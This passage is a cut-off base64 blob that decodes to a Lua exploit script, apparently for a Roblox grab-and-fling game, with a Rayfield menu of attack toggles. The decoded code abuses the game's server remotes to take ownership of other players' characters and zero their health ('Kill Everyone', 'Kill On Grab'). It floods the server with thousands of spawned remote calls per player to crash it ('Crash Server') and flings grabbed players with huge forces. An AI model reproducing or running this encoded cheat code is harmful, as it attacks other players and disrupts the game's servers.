wgdGhpdWduYnJld2lvZ3JuZWIKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB0aGl1Z25icmV3aW9ncm5lYiA9IFJ1blNlcnZpY2UuUmVuZGVyU3RlcHBlZDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWxURm9sZGVyLkNyZWF0dXJlQmxvYm1hbi5CbG9ibWFuU2VhdEFuZE93bmVyU2NyaXB0LkNyZWF0dXJlR3JhYjpGaXJlU2VydmVyKAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsVEZvbGRlci5DcmVhdHVyZUJsb2JtYW4uTGVmdERldGVjdG9yLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhcmdldGhycCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFRGb2xkZXIuQ3JlYXR1cmVCbG9ibWFuLkxlZnREZXRlY3Rvci5MZWZ0V2VsZCkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGxvY2FsVEZvbGRlci5DcmVhdHVyZUJsb2JtYW4uQmxvYm1hblNlYXRBbmRPd25lclNjcmlwdC5DcmVhdHVyZUdyYWI6RmlyZVNlcnZlcigKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBsb2NhbFRGb2xkZXIuQ3JlYXR1cmVCbG9ibWFuLkxlZnREZXRlY3Rvci5MZWZ0V2VsZCwKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNYWluSHJwKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjA1KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGlmIHRoaXVnbmJyZXdpb2dybmViIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGhpdWduYnJld2lvZ3JuZWI6RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRoaXVnbmJyZXdpb2dybmViID0gbmlsCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgaWYgTWFpbkhycCB0aGVuCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIE1haW5IcnAuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNYWluSHJwLkFzc2VtYmx5TGluZWFyVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgTWFpbkhycC5Bc3NlbWJseUFuZ3VsYXJWZWxvY2l0eSA9IFZlY3RvcjMuemVybwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBNYWluQ2hhcmFjdGVyOlBpdm90VG8oQ0ZyYW1lLm5ldyhpbml0aWFsUG9zaXRpb24pKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2sud2FpdCgwLjEpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgaWYgTWFpbkhycCBhbmQgTWFpbkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgICAgICAgICAgTWFpbkhycC5BbmNob3JlZCA9IHRydWUKICAgICAgICAgICAgICAgICAgICBNYWluSHJwLkFzc2VtYmx5TGluZWFyVmVsb2NpdHkgPSBWZWN0b3IzLnplcm8KICAgICAgICAgICAgICAgICAgICBNYWluSHJwLkFzc2VtYmx5QW5ndWxhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgTWFpbkNoYXJhY3RlcjpQaXZvdFRvKENGcmFtZS5uZXcoaW5pdGlhbFBvc2l0aW9uKSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgIE1haW5IcnAuQW5jaG9yZWQgPSBmYWxzZQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAp9KQoKbG9jYWwga2lsbEFsbFNldHRpbmdzID0gewogICAgQSA9IGZhbHNlLAogICAgUSA9IHt9LAogICAgUG9zID0gbmlsLAogICAgQ2FtID0gbmlsLAogICAgQ29ubiA9IG5pbCwKICAgIENCID0gSW5zdGFuY2UubmV3KCJQYXJ0IikKfQoKa2lsbEFsbFNldHRpbmdzLkNCLkFuY2hvcmVkID0gdHJ1ZQpraWxsQWxsU2V0dGluZ3MuQ0IuQ2FuQ29sbGlkZSA9IGZhbHNlCmtpbGxBbGxTZXR0aW5ncy5DQi5UcmFuc3BhcmVuY3kgPSAxCmtpbGxBbGxTZXR0aW5ncy5DQi5DYW5RdWVyeSA9IGZhbHNlCmtpbGxBbGxTZXR0aW5ncy5DQi5TaXplID0gVmVjdG9yMy5uZXcoMTAsIDEwLCAxMCkKCmxvY2FsIGZ1bmN0aW9uIEZ6Q2FtS2lsbCgpCiAgICBsb2NhbCBjYW1lcmEgPSBXb3Jrc3BhY2UuQ3VycmVudENhbWVyYQogICAga2lsbEFsbFNldHRpbmdzLkNCLkNGcmFtZSA9IGtpbGxBbGxTZXR0aW5ncy5DYW0KICAgIGtpbGxBbGxTZXR0aW5ncy5DQi5QYXJlbnQgPSBXb3Jrc3BhY2UKICAgIGNhbWVyYS5DYW1lcmFUeXBlID0gRW51bS5DYW1lcmFUeXBlLlNjcmlwdGFibGUKICAgIGNhbWVyYS5DRnJhbWUgPSBraWxsQWxsU2V0dGluZ3MuQ2FtCmVuZAoKbG9jYWwgZnVuY3Rpb24gVW5GekNhbUtpbGwoKQogICAga2lsbEFsbFNldHRpbmdzLkNCLlBhcmVudCA9IG5pbAogICAgbG9jYWwgY2FtZXJhID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgIGNhbWVyYS5DYW1lcmFUeXBlID0gRW51bS5DYW1lcmFUeXBlLkN1c3RvbQogICAgaWYga2lsbEFsbFNldHRpbmdzLkNhbSB0aGVuCiAgICAgICAgY2FtZXJhLkNGcmFtZSA9IGtpbGxBbGxTZXR0aW5ncy5DYW0KICAgIGVuZAogICAga2lsbEFsbFNldHRpbmdzLkNhbSA9IG5pbAplbmQKCmxvY2FsIGZ1bmN0aW9uIE5vQ29sS2lsbChtb2RlbCkKICAgIHBjYWxsKGZ1bmN0aW9uKCkKICAgICAgICBmb3IgXywgcGFydCBpbiBwYWlycyhtb2RlbDpHZXREZXNjZW5kYW50cygpKSBkbwogICAgICAgICAgICBpZiBwYXJ0OklzQSgiQmFzZVBhcnQiKSB0aGVuCiAgICAgICAgICAgICAgICBwYXJ0LkNhbkNvbGxpZGUgPSBmYWxzZQogICAgICAgICAgICBlbmQKICAgICAgICBlbmQKICAgIGVuZCkKZW5kCgpsb2NhbCBmdW5jdGlvbiBSZVFLaWxsKCkKICAgIGtpbGxBbGxTZXR0aW5ncy5RID0ge30KICAgIGZvciBfLCBwbGF5ZXIgaW4gcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBub3QgaXNJblBsb3QocGxheWVyKSBhbmQgcGxheWVyLkNoYXJhY3RlciB0aGVuCiAgICAgICAgICAgIGxvY2FsIGh1bSA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGRPZkNsYXNzKCJIdW1hbm9pZCIpCiAgICAgICAgICAgIGlmIGh1bSBhbmQgaHVtLkhlYWx0aCA+IDAgdGhlbgogICAgICAgICAgICAgICAgdGFibGUuaW5zZXJ0KGtpbGxBbGxTZXR0aW5ncy5RLCBwbGF5ZXIpCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCmVuZAoKbG9jYWwgZnVuY3Rpb24gTmV4dEtpbGwoKQogICAgaWYgI2tpbGxBbGxTZXR0aW5ncy5RID09IDAgdGhlbgogICAgICAgIFJlUUtpbGwoKQogICAgICAgIGlmICNraWxsQWxsU2V0dGluZ3MuUSA9PSAwIHRoZW4KICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICBlbmQKICAgIAogICAgbG9jYWwgcGxheWVyID0ga2lsbEFsbFNldHRpbmdzLlFbMV0KICAgIHRhYmxlLnJlbW92ZShraWxsQWxsU2V0dGluZ3MuUSwgMSkKICAgIAogICAgaWYgcGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICBsb2NhbCByb290ID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgbG9jYWwgaHVtID0gcGxheWVyLkNoYXJhY3RlcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWQiKQogICAgICAgIGxvY2FsIGhlYWQgPSBwbGF5ZXIuQ2hhcmFjdGVyOkZpbmRGaXJzdENoaWxkKCJIZWFkIikKICAgICAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICBsb2NhbCBteVJvb3QgPSBteUNoYXIgYW5kIG15Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICAgICAgCiAgICAgICAgaWYgcm9vdCBhbmQgaGVhZCBhbmQgbXlSb290IGFuZCBodW0gYW5kIGh1bS5IZWFsdGggPiAwIHRoZW4KICAgICAgICAgICAgcGNhbGwoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgbXlDaGFyOlBpdm90VG8ocm9vdC5DRnJhbWUgKiBDRnJhbWUubmV3KDAsIC02LCAwKSkKICAgICAgICAgICAgICAgIE5vQ29sS2lsbChteUNoYXIpCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGxvY2FsIGF0dGVtcHRzID0gMAogICAgICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICAgICAgU2V0TmV0d29ya093bmVyOkZpcmVTZXJ2ZXIocm9vdCwgbXlSb290LkNGcmFtZSkKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4xKQogICAgICAgICAgICAgICAgICAgIGF0dGVtcHRzID0gYXR0ZW1wdHMgKyAxCiAgICAgICAgICAgICAgICB1bnRpbCBhdHRlbXB0cyA+IDE1IG9yIChoZWFkOkZpbmRGaXJzdENoaWxkKCJQYXJ0T3duZXIiKSBhbmQgaGVhZC5QYXJ0T3duZXIuVmFsdWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSkgb3Igbm90IGtpbGxBbGxTZXR0aW5ncy5BCiAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgIGlmIGtpbGxBbGxTZXR0aW5ncy5BIGFuZCBoZWFkOkZpbmRGaXJzdENoaWxkKCJQYXJ0T3duZXIiKSBhbmQgaGVhZC5QYXJ0T3duZXIuVmFsdWUgPT0gTG9jYWxQbGF5ZXIuTmFtZSB0aGVuCiAgICAgICAgICAgICAgICAgICAgcm9vdC5DRnJhbWUgPSBDRnJhbWUubmV3KGtpbGxBbGxTZXR0aW5ncy5Qb3MpCiAgICAgICAgICAgICAgICAgICAgcm9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgICAgICAgICAgICAgaHVtLkhlYWx0aCA9IDAKICAgICAgICAgICAgICAgICAgICB0YXNrLndhaXQoMC4zKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbmQKICAgIGVuZAplbmQKCmxvY2FsIGZ1bmN0aW9uIFN0YXJ0S2lsbEFsbCgpCiAgICBsb2NhbCBteUNoYXIgPSBMb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgIGxvY2FsIG15Um9vdCA9IG15Q2hhciBhbmQgbXlDaGFyOkZpbmRGaXJzdENoaWxkKCJIdW1hbm9pZFJvb3RQYXJ0IikKICAgIAogICAgaWYgbXlSb290IHRoZW4KICAgICAgICBraWxsQWxsU2V0dGluZ3MuUG9zID0gbXlSb290LlBvc2l0aW9uCiAgICAgICAga2lsbEFsbFNldHRpbmdzLkNhbSA9IFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZQogICAgICAgIFJlUUtpbGwoKQogICAgICAgIEZ6Q2FtS2lsbCgpCiAgICAgICAga2lsbEFsbFNldHRpbmdzLkNvbm4gPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgaWYga2lsbEFsbFNldHRpbmdzLkEgdGhlbgogICAgICAgICAgICAgICAgTmV4dEtpbGwoKQogICAgICAgICAgICAgICAgaWYga2lsbEFsbFNldHRpbmdzLkNhbSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgY2FtZXJhID0gV29ya3NwYWNlLkN1cnJlbnRDYW1lcmEKICAgICAgICAgICAgICAgICAgICBjYW1lcmEuQ2FtZXJhVHlwZSA9IEVudW0uQ2FtZXJhVHlwZS5TY3JpcHRhYmxlCiAgICAgICAgICAgICAgICAgICAgY2FtZXJhLkNGcmFtZSA9IGtpbGxBbGxTZXR0aW5ncy5DYW0KICAgICAgICAgICAgICAgICAgICBraWxsQWxsU2V0dGluZ3MuQ0IuQ0ZyYW1lID0ga2lsbEFsbFNldHRpbmdzLkNhbQogICAgICAgICAgICAgICAgICAgIGtpbGxBbGxTZXR0aW5ncy5DQi5QYXJlbnQgPSBXb3Jrc3BhY2UKICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICBlbmQKICAgICAgICBlbmQpCiAgICBlbmQKZW5kCgpsb2NhbCBmdW5jdGlvbiBTdG9wS2lsbEFsbCgpCiAgICBpZiBraWxsQWxsU2V0dGluZ3MuQ29ubiB0aGVuCiAgICAgICAga2lsbEFsbFNldHRpbmdzLkNvbm46RGlzY29ubmVjdCgpCiAgICAgICAga2lsbEFsbFNldHRpbmdzLkNvbm4gPSBuaWwKICAgIGVuZAogICAgVW5GekNhbUtpbGwoKQogICAgbG9jYWwgbXlDaGFyID0gTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICBsb2NhbCBteVJvb3QgPSBteUNoYXIgYW5kIG15Q2hhcjpGaW5kRmlyc3RDaGlsZCgiSHVtYW5vaWRSb290UGFydCIpCiAgICBpZiBteVJvb3QgYW5kIGtpbGxBbGxTZXR0aW5ncy5Qb3MgdGhlbgogICAgICAgIG15Um9vdC5Bc3NlbWJseUxpbmVhclZlbG9jaXR5ID0gVmVjdG9yMy56ZXJvCiAgICAgICAgbXlSb290LkNGcmFtZSA9IENGcmFtZS5uZXcoa2lsbEFsbFNldHRpbmdzLlBvcykKICAgIGVuZAplbmQKCkF0dGFja1RhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJLaWxsIEV2ZXJ5b25lIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgRmxhZyA9ICJLaWxsQWxsIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAga2lsbEFsbFNldHRpbmdzLkEgPSBWYWx1ZQogICAgICAgIGlmIFZhbHVlIHRoZW4KICAgICAgICAgICAgUmF5ZmllbGQ6Tm90aWZ5KHsKICAgICAgICAgICAgICAgIFRpdGxlID0gIktpbGwgQWxsIiwKICAgICAgICAgICAgICAgIENvbnRlbnQgPSAiS2lsbGluZyBldmVyeW9uZSIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIFN0YXJ0S2lsbEFsbCgpCiAgICAgICAgZWxzZQogICAgICAgICAgICBTdG9wS2lsbEFsbCgpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCmxvY2FsIGNyYXNoaW5nQWxsID0gZmFsc2UKbG9jYWwgY3Jhc2hBbGxDb25uZWN0aW9uID0gbmlsCgpBdHRhY2tUYWI6Q3JlYXRlVG9nZ2xlKHsKICAgIE5hbWUgPSAiQ3Jhc2ggU2VydmVyIiwKICAgIEN1cnJlbnRWYWx1ZSA9IGZhbHNlLAogICAgRmxhZyA9ICJDcmFzaEFsbFRvZ2dsZSIsCiAgICBDYWxsYmFjayA9IGZ1bmN0aW9uKFZhbHVlKQogICAgICAgIGNyYXNoaW5nQWxsID0gVmFsdWUKICAgICAgICAKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIFJheWZpZWxkOk5vdGlmeSh7CiAgICAgICAgICAgICAgICBUaXRsZSA9ICJDcmFzaCBBbGwiLAogICAgICAgICAgICAgICAgQ29udGVudCA9ICJBdHRlbXB0aW5nIHRvIGNyYXNoIHNlcnZlciIsCiAgICAgICAgICAgICAgICBEdXJhdGlvbiA9IDMsCiAgICAgICAgICAgICAgICBJbWFnZSA9IDQ0ODMzNjI0NTgsCiAgICAgICAgICAgIH0pCiAgICAgICAgICAgIAogICAgICAgICAgICBjcmFzaEFsbENvbm5lY3Rpb24gPSBSdW5TZXJ2aWNlLkhlYXJ0YmVhdDpDb25uZWN0KGZ1bmN0aW9uKCkKICAgICAgICAgICAgICAgIGlmIG5vdCBjcmFzaGluZ0FsbCB0aGVuIHJldHVybiBlbmQKICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgZm9yIF8sIHBsYXllciBpbiBpcGFpcnMoUGxheWVyczpHZXRQbGF5ZXJzKCkpIGRvCiAgICAgICAgICAgICAgICAgICAgaWYgcGxheWVyIH49IExvY2FsUGxheWVyIGFuZCBwbGF5ZXIuQ2hhcmFjdGVyIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgbG9jYWwgcm9vdCA9IHBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgICAgICAgICAgICAgICAgICBpZiByb290IHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHRhc2suc3Bhd24oZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIGZvciBpID0gMSwgMTAwMDAgZG8KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgdGFzay5zcGF3bihmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBwY2FsbChmdW5jdGlvbigpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQ3JlYXRlR3JhYkxpbmU6RmlyZVNlcnZlcihyb290LCBDRnJhbWUubmV3KG1hdGgucmFuZG9tKC05OTk5OSwgOTk5OTkpLCBtYXRoLnJhbmRvbSgtOTk5OTksIDk5OTk5KSwgbWF0aC5yYW5kb20oLTk5OTk5LCA5OTk5OSkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIFNldE5ldHdvcmtPd25lcjpGaXJlU2VydmVyKHJvb3QsIENGcmFtZS5uZXcobWF0aC5yYW5kb20oLTk5OTk5LCA5OTk5OSksIG1hdGgucmFuZG9tKC05OTk5OSwgOTk5OTkpLCBtYXRoLnJhbmRvbSgtOTk5OTksIDk5OTk5KSkpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgRXh0ZW5kR3JhYkxpbmU6RmlyZVNlcnZlcihyb290LCBWZWN0b3IzLm5ldyhtYXRoLnJhbmRvbSgtOTk5OTksIDk5OTk5KSwgbWF0aC5yYW5kb20oLTk5OTk5LCA5OTk5OSksIG1hdGgucmFuZG9tKC05OTk5OSwgOTk5OTkpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBEZXN0cm95R3JhYkxpbmU6RmlyZVNlcnZlcihyb290KQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIENyZWF0ZUdyYWJMaW5lOkZpcmVTZXJ2ZXIocm9vdCwgQ0ZyYW1lLm5ldyhtYXRoLnJhbmRvbSgtOTk5OTksIDk5OTk5KSwgbWF0aC5yYW5kb20oLTk5OTk5LCA5OTk5OSksIG1hdGgucmFuZG9tKC05OTk5OSwgOTk5OTkpKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBTZXROZXR3b3JrT3duZXI6RmlyZVNlcnZlcihyb290LCBDRnJhbWUubmV3KG1hdGgucmFuZG9tKC05OTk5OSwgOTk5OTkpLCBtYXRoLnJhbmRvbSgtOTk5OTksIDk5OTk5KSwgbWF0aC5yYW5kb20oLTk5OTk5LCA5OTk5OSkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmQpCiAgICAgICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICBlbHNlCiAgICAgICAgICAgIGlmIGNyYXNoQWxsQ29ubmVjdGlvbiB0aGVuCiAgICAgICAgICAgICAgICBjcmFzaEFsbENvbm5lY3Rpb246RGlzY29ubmVjdCgpCiAgICAgICAgICAgICAgICBjcmFzaEFsbENvbm5lY3Rpb24gPSBuaWwKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKClBsYXllcnMuUGxheWVyQWRkZWQ6Q29ubmVjdCh1cGRhdGVEcm9wZG93bnMpClBsYXllcnMuUGxheWVyUmVtb3Zpbmc6Q29ubmVjdChmdW5jdGlvbihwbGF5ZXIpCiAgICBpZiBhdHRhY2tUYXJnZXRzW3BsYXllci5OYW1lXSB0aGVuCiAgICAgICAgYXR0YWNrVGFyZ2V0c1twbGF5ZXIuTmFtZV0gPSBuaWwKICAgIGVuZAogICAgdXBkYXRlRHJvcGRvd25zKCkKZW5kKQoKdXBkYXRlRHJvcGRvd25zKCkKCmxvY2FsIEdyYWJTZWN0aW9uID0gQXR0YWNrVGFiOkNyZWF0ZVNlY3Rpb24oIkdyYWIgUG93ZXJzIikKCmxvY2FsIGtpbGxHcmFiRW5hYmxlZCA9IGZhbHNlCmxvY2FsIGZ1bmN0aW9uIGtpbGxHcmFiRigpCiAgICBpZiBraWxsR3JhYkVuYWJsZWQgdGhlbgogICAgICAgIFdvcmtzcGFjZS5DaGlsZEFkZGVkOkNvbm5lY3QoZnVuY3Rpb24oY2hpbGQpCiAgICAgICAgICAgIGlmIGNoaWxkOklzQSgiTW9kZWwiKSBhbmQgY2hpbGQuTmFtZSA9PSAiR3JhYlBhcnRzIiBhbmQga2lsbEdyYWJFbmFibGVkIHRoZW4KICAgICAgICAgICAgICAgIGxvY2FsIGdyYWJQYXJ0ID0gY2hpbGQ6RmluZEZpcnN0Q2hpbGQoIkdyYWJQYXJ0IikKICAgICAgICAgICAgICAgIGlmIGdyYWJQYXJ0IGFuZCBncmFiUGFydDpGaW5kRmlyc3RDaGlsZCgiV2VsZENvbnN0cmFpbnQiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgbG9jYWwgcGFydDEgPSBncmFiUGFydC5XZWxkQ29uc3RyYWludC5QYXJ0MQogICAgICAgICAgICAgICAgICAgIGxvY2FsIGh1bWFub2lkID0gcGFydDEgYW5kIHBhcnQxLlBhcmVudCBhbmQgcGFydDEuUGFyZW50IH49IExvY2FsUGxheWVyLkNoYXJhY3RlciBhbmQgcGFydDEuUGFyZW50OkZpbmRGaXJzdENoaWxkT2ZDbGFzcygiSHVtYW5vaWQiKQogICAgICAgICAgICAgICAgICAgIGlmIGh1bWFub2lkIHRoZW4KICAgICAgICAgICAgICAgICAgICAgICAgaHVtYW5vaWQuSGVhbHRoID0gMAogICAgICAgICAgICAgICAgICAgIGVuZAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZCkKICAgIGVuZAplbmQKCkF0dGFja1RhYjpDcmVhdGVUb2dnbGUoewogICAgTmFtZSA9ICJLaWxsIE9uIEdyYWIiLAogICAgQ3VycmVudFZhbHVlID0gZmFsc2UsCiAgICBGbGFnID0gIktpbGxHcmFiIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oVmFsdWUpCiAgICAgICAga2lsbEdyYWJFbmFibGVkID0gVmFsdWUKICAgICAgICBpZiBWYWx1ZSB0aGVuCiAgICAgICAgICAgIGtpbGxHcmFiRigpCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCmxvY2FsIHN0cmVuZ3RoU2V0dGluZ3MgPSB7CiAgICBFbmFibGVkID0gZmFsc2UsCiAgICBTdHJlbmd0aCA9IDgwMCwKICAgIEdyYWJDb25uID0gbmlsCn0KCmxvY2FsIGZ1bmN0aW9uIG9uR3JhYkFkZGVkKGdyYWJQYXJ0cykKICAgIGlmIG5vdCBzdHJlbmd0aFNldHRpbmdzLkVuYWJsZWQgdGhlbiByZXR1cm4gZW5kCiAgICBpZiBncmFiUGFydHMuTmFtZSB+PSAiR3JhYlBhcnRzIiB0aGVuIHJldHVybiBlbmQKICAgIAogICAgbG9jYWwgZ3JhYlBhcnQgPSBncmFiUGFydHM6RmluZEZpcnN0Q2hpbGQoIkdyYWJQYXJ0IikKICAgIGlmIG5vdCAoZ3JhYlBhcnQgYW5kIGdyYWJQYXJ0OkZpbmRGaXJzdENoaWxkKCJXZWxkQ29uc3RyYWludCIpKSB0aGVuIHJldHVybiBlbmQKICAgIAogICAgbG9jYWwgcGFydDEgPSBncmFiUGFydC5XZWxkQ29uc3RyYWludC5QYXJ0MQogICAgaWYgbm90IHBhcnQxIHRoZW4gcmV0dXJuIGVuZAogICAgCiAgICBsb2NhbCBidiA9IEluc3RhbmNlLm5ldygiQm9keVZlbG9jaXR5IikKICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcoMCwgMCwgMCkKICAgIGJ2LlBhcmVudCA9IHBhcnQxCiAgICAKICAgIGxvY2FsIGJ1dHRvbiA9IG5pbAogICAgbG9jYWwgY29ubjEsIGNvbm4yLCBjb25uMyA9IG5pbCwgbmlsLCBuaWwKICAgIAogICAgd2hpbGUgdHJ1ZSBkbwogICAgICAgIGlmIGJ1dHRvbiBvciBub3QgKGdyYWJQYXJ0cy5QYXJlbnQgYW5kIHN0cmVuZ3RoU2V0dGluZ3MuRW5hYmxlZCkgdGhlbgogICAgICAgICAgICBpZiBidXR0b24gYW5kIHN0cmVuZ3RoU2V0dGluZ3MuRW5hYmxlZCB0aGVuCiAgICAgICAgICAgICAgICBsb2NhbCBmdW5jdGlvbiBsYXVuY2goKQogICAgICAgICAgICAgICAgICAgIGJ2Lk1heEZvcmNlID0gVmVjdG9yMy5uZXcobWF0aC5odWdlLCBtYXRoLmh1Z2UsIG1hdGguaHVnZSkKICAgICAgICAgICAgICAgICAgICBidi5WZWxvY2l0eSA9IFdvcmtzcGFjZS5DdXJyZW50Q2FtZXJhLkNGcmFtZS5Mb29rVmVjdG9yICogc3RyZW5ndGhTZXR0aW5ncy5TdHJlbmd0aAogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgICAgICBjb25uMSA9IGJ1dHRvbi5Nb3VzZUJ1dHRvbjFVcDpDb25uZWN0KGxhdW5jaCkKICAgICAgICAgICAgICAgIGNvbm4yID0gYnV0dG9uLk1vdXNlQnV0dG9uMURvd246Q29ubmVjdChsYXVuY2gpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBjb25uMyA9IGdyYWJQYXJ0czpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoIlBhcmVudCIpOkNvbm5lY3QoZnVuY3Rpb24oKQogICAgICAgICAgICAgICAgaWYgbm90IGdyYWJQYXJ0cy5QYXJlbnQgdGhlbgogICAgICAgICAgICAgICAgICAgIGlmIGNvbm4xIHRoZW4gY29ubjE6RGlzY29ubmVjdCgpIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIGNvbm4yIHRoZW4gY29ubjI6RGlzY29ubmVjdCgpIGVuZAogICAgICAgICAgICAgICAgICAgIGlmIGNvbm4zIHRoZW4gY29ubjM6RGlzY29ubmVjdCgpIGVuZAogICAgICAgICAgICAgICAgICAgIERlYnJpczpBZGRJdGVtKGJ2LCAxKQogICAgICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIGVuZCkKICAgICAgICAgICAgcmV0dXJuCiAgICAgICAgZW5kCiAgICAgICAgCiAgICAgICAgZm9yIF8sIG9iaiBpb